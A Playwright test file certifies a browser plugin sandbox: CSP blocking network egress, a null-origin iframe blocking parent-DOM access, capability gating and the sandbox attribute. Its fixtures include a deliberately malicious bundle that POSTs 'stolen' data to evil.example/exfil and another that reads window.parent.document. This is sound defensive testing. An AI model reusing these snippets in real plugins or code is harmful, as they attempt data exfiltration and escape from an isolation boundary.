// REAL BROWSER SECURITY CERTIFICATE for the third-party plugin runtime (#446).
//
// Runs in real Chromium (Playwright). This is the ONLY test that can prove the
// load-bearing sandbox invariants, because happy-dom/jsdom enforce NEITHER of them:
//   (a) CSP `connect-src 'none'` blocks all network egress from the plugin frame;
//   (b) the null-origin sandbox blocks `window.parent.document` (SecurityError).
// It also re-asserts, as a live cross-check, the properties the DOM-free bun suite
// already proves ((c) the bundle really runs under CSP via `new Function` +
// `'unsafe-eval'`, (d) the host capability gate rejects an ungranted call, (e) the
// iframe `sandbox` attribute is exactly `allow-scripts`).
//
// The harness (`e2e/harness/`) mounts the REAL `<ExtensionHost>` with the REAL
// `thirdPartyPluginSrcdoc` bootstrap and the REAL capability-gated `dispatchRpc`
// services — no reimplementation of the boundary.
//
// ⚠️ EXECUTION: headless Chromium cannot launch in the authoring sandbox, so this
// spec is authored + typechecked here (`bunx playwright test --list`) and RUN GREEN
// in CI by the `plugin-runtime-cert` job. It gates flipping the runtime flag on
// (see `src/lib/experimental.ts`).

import { expect, test } from "@playwright/test";

const PLUGIN_ID = "app__cert-panel";
const OWN_ROUTE = `/plugin/${encodeURIComponent(PLUGIN_ID)}`;

/** Host-observed event shape, mirrored from the harness `HostEvent`. */
interface HostEvent {
	accepted?: boolean;
	claim?: { path: string; title: string };
	returned?: Record<string, unknown>[];
	type: "connected" | "listAgents" | "registerRoute";
}

interface MountOptions {
	agents?: { id: string; name: string; secret?: string }[];
	grants: string[];
	pluginId: string;
	uiCode: string;
}

// The harness API on `window`, for typed `page.evaluate` calls.
declare global {
	interface Window {
		__ryuCert: {
			hostLog: HostEvent[];
			mount: (options: MountOptions) => void;
			sandboxAttr: () => string | null;
		};
	}
}

// ── Plugin bundles injected into the REAL sandbox ───────────────────────────────

/** MALICIOUS: attempts network exfiltration. CSP `connect-src 'none'` must reject
 *  the fetch; the caught rejection is surfaced for the spec to read. */
const EGRESS_BUNDLE = `
function activate(context) {
  fetch("https://evil.example/exfil", { method: "POST", body: "stolen" })
    .then(function () {
      var el = document.getElementById("ryu-plugin-error");
      el.style.display = "block";
      el.textContent = "EGRESS-SUCCEEDED";
    })
    .catch(function (e) {
      var el = document.getElementById("ryu-plugin-error");
      el.style.display = "block";
      el.textContent = "EGRESS-BLOCKED: " + (e && e.message ? e.message : String(e));
    });
}
`;

/** MALICIOUS: attempts to read the parent DOM. The null origin makes this throw a
 *  SecurityError, caught and surfaced. */
const PARENT_DOM_BUNDLE = `
function activate(context) {
  try {
    var doc = window.parent.document;
    var title = doc && doc.title;
    var el = document.getElementById("ryu-plugin-error");
    el.style.display = "block";
    el.textContent = "PARENT-DOM-REACHED:" + String(title);
  } catch (e) {
    var el2 = document.getElementById("ryu-plugin-error");
    el2.style.display = "block";
    el2.textContent = "PARENT-DOM-BLOCKED: " + (e && e.name ? e.name : String(e));
  }
}
`;

/** BENIGN: claims its own route and calls its one granted capability, writing the
 *  projection back so the spec can confirm activate() ran end to end under CSP. */
const BENIGN_BUNDLE = `
function activate(context) {
  var own = "/plugin/" + encodeURIComponent(context.pluginId);
  context.plugin.registerRoute({ path: own, title: "Cert Panel" });
  context.plugin.host.listAgents()
    .then(function (agents) {
      var root = document.getElementById("ryu-plugin-root");
      root.setAttribute("data-agents", JSON.stringify(agents));
      root.textContent = "LOADED:" + agents.length;
    })
    .catch(function (e) {
      var el = document.getElementById("ryu-plugin-error");
      el.style.display = "block";
      el.textContent = "listAgents-ERR: " + (e && e.message ? e.message : String(e));
    });
}
`;

async function bootHarness(page: import("@playwright/test").Page) {
	await page.goto("/");
	await page.waitForFunction(() => Boolean(window.__ryuCert?.mount));
}

async function mount(
	page: import("@playwright/test").Page,
	options: MountOptions
) {
	await page.evaluate((opts) => window.__ryuCert.mount(opts), options);
}

test.describe("plugin runtime — REAL browser security certificate", () => {
	// (a) EGRESS BLOCKED — the non-fakeable one.
	test("(a) CSP blocks all network egress from the plugin frame", async ({
		page,
	}) => {
		const evilRequests: string[] = [];
		page.on("request", (req) => {
			if (req.url().includes("evil.example")) {
				evilRequests.push(req.url());
			}
		});

		await bootHarness(page);
		await mount(page, {
			uiCode: EGRESS_BUNDLE,
			pluginId: PLUGIN_ID,
			grants: [],
		});

		const errorBox = page
			.frameLocator("#host-root iframe")
			.locator("#ryu-plugin-error");
		// PRIMARY signal: the bundle's own fetch was rejected by CSP.
		await expect(errorBox).toContainText("EGRESS-BLOCKED");
		await expect(errorBox).not.toContainText("EGRESS-SUCCEEDED");
		// SECONDARY signal: no request to the exfil host ever left the browser.
		expect(evilRequests).toHaveLength(0);
	});

	// (b) PARENT DOM BLOCKED — the other non-fakeable one.
	test("(b) null origin blocks window.parent.document", async ({ page }) => {
		await bootHarness(page);
		await mount(page, {
			uiCode: PARENT_DOM_BUNDLE,
			pluginId: PLUGIN_ID,
			grants: [],
		});

		const errorBox = page
			.frameLocator("#host-root iframe")
			.locator("#ryu-plugin-error");
		await expect(errorBox).toContainText("PARENT-DOM-BLOCKED");
		await expect(errorBox).not.toContainText("PARENT-DOM-REACHED");
	});

	// (c) BUNDLE EXECUTES UNDER CSP (proves script-src 'unsafe-eval' is correct).
	test("(c) the benign bundle runs activate() end to end under CSP", async ({
		page,
	}) => {
		await bootHarness(page);
		await mount(page, {
			uiCode: BENIGN_BUNDLE,
			pluginId: PLUGIN_ID,
			grants: ["ui:render", "core:list_agents"],
			agents: [{ id: "ryu", name: "Ryu", secret: "node-token" }],
		});

		// The plugin root gets the projection → activate() ran (new Function worked).
		const root = page
			.frameLocator("#host-root iframe")
			.locator("#ryu-plugin-root");
		await expect(root).toContainText("LOADED:1");
		const projected = await root.getAttribute("data-agents");
		expect(JSON.parse(projected ?? "null")).toEqual([
			{ id: "ryu", name: "Ryu" },
		]);

		// Host side observed the registerRoute claim (accepted, own surface) and the
		// listAgents projection — never the secret.
		await expect
			.poll(() => page.evaluate(() => window.__ryuCert.hostLog))
			.toEqual(
				expect.arrayContaining([
					expect.objectContaining({
						type: "registerRoute",
						accepted: true,
						claim: { path: OWN_ROUTE, title: "Cert Panel" },
					}),
					expect.objectContaining({
						type: "listAgents",
						returned: [{ id: "ryu", name: "Ryu" }],
					}),
				])
			);
	});

	// (d) UNGRANTED CAPABILITY REJECTED by the host gate.
	test("(d) an ungranted capability call is rejected by the host", async ({
		page,
	}) => {
		await bootHarness(page);
		// Grant ONLY ui:render → core.listAgents is ungranted.
		await mount(page, {
			uiCode: BENIGN_BUNDLE,
			pluginId: PLUGIN_ID,
			grants: ["ui:render"],
		});

		const errorBox = page
			.frameLocator("#host-root iframe")
			.locator("#ryu-plugin-error");
		await expect(errorBox).toContainText("listAgents-ERR");
		await expect(errorBox).toContainText("Capability not granted");
	});

	// (e) SANDBOX ATTR — the iframe is exactly allow-scripts.
	test("(e) the iframe sandbox attribute is exactly 'allow-scripts'", async ({
		page,
	}) => {
		await bootHarness(page);
		await mount(page, {
			uiCode: BENIGN_BUNDLE,
			pluginId: PLUGIN_ID,
			grants: ["ui:render", "core:list_agents"],
		});

		const sandbox = await page
			.locator("#host-root iframe")
			.getAttribute("sandbox");
		expect(sandbox).toBe("allow-scripts");
		expect(sandbox).not.toContain("allow-same-origin");
	});
});
